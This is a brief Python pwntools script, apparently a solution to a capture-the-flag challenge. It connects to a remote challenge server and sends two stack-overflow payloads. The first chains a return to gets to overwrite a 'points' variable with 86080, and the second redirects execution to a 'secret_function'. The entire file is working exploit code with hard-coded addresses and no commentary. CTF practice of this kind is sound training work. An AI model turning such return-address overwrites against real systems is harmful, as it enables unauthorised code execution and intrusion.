from pwn import *

scanf = 0x8048400
main = 0x8048648
points = 0x0804a090
gets = 0x80483d0
secret_function = 0x804851b
spec = 0x8048789

r = remote('hack.bckdr.in', 13372)
# r = process('./pwn_public')
p = ''
p += 'AAAABBBBCCCCDDDDEEEE'
p += p32(gets)
p += p32(main)
p += p32(points)
r.recv(1024)
r.sendline(p)

r.sendline('86080')

r.recv(1024)
p = ''
p += 'AAAABBBBCCCCDDDDEEEE'
p += p32(secret_function)
p += p32(main)
r.sendline(p)
r.recv(1024)

r.sendline(p)
print r.recv(1024)